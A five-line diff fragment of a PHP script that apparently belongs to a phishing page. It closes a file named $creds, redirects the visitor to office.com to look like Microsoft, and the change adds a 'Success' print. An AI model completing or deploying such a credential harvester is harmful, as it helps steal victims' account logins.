@@ -5,4 +5,5 @@
     fclose($creds);
     // Redirect to Microsoft
     header("Location: https://www.office.com");
+    print("Success");
 ?>
